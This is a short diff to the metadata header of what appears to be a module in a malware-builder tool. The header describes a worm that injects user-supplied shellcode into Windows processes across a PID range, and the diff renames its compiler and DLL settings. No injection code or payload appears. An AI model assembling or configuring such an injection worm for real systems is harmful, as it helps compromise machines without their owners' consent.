@@ -2,7 +2,7 @@
 #!types##worm
 #!info##A worm that tries to inject shellcode into a process. It checks each process PID from the given range and tries to inject shellcode.
 #!system_FLAG##[W]
-#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##COMPILER##mingw-x32##Compiler name
 #!globalVar##OS_EXEC##win##Target system executable
 #!processWorm##BasicAsm
 #!lang##asm
@@ -11,7 +11,7 @@
 #!reqVar##BP_shellcode##Shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
 #!setVar##BP_start_pid##900##int
 #!setVar##BP_max_pid##11000##int
-#!globalVar##COMPILER_NO_DLL##Not include DLLs
+#!globalVar##NO_DLL##Not include DLLs
 #!banned##module##starter##shadow##junk
 
                     
